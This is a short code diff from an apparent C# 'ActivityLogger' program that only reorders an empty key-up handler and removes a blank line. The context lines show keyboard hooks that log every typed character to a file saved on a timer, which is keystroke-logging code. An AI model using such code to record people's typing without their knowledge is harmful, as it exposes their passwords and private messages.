@@ -59,12 +59,12 @@ namespace ActivityLogger
 
         public void HookerKeyDown(object sender, KeyEventArgs e){}
 
+        public void HookerKeyUp(object sender, KeyEventArgs e) { }
+
         public void HookerKeyPress(object sender, KeyPressEventArgs e)
         {
             Logger(FilterKeyChar(e.KeyChar));
         }
-
-        public void HookerKeyUp(object sender, KeyEventArgs e){}
 
         private string FilterKeyChar(char key)
         {
@@ -119,7 +119,6 @@ namespace ActivityLogger
             Application.Exit();
         }
 
-        
         private void TimerLogsaverTick(object sender, EventArgs e)
         {
             logger.Save(logger.LogFilePath);
